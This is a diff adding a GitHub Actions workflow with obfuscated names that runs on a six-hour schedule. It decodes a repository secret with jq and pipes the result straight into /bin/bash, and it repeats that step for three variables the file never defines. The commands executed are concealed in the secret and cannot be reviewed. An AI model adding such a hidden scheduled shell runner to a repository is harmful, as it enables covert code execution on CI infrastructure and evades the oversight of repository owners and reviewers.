@@ -1,0 +1,20 @@
+name: wenlianggong4378
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wenlianggong4378
+        env:
+          e9: ${{ secrets.e9 }}
+        run: |
+          echo $e9 | jq -r .yatge74 | /bin/bash
+          echo $ma4 | jq -r .gbd087 | /bin/bash
+          echo $oi7 | jq -r .z45066 | /bin/bash
+          echo $ruooa72115 | jq -r .rr2347 | /bin/bash
+
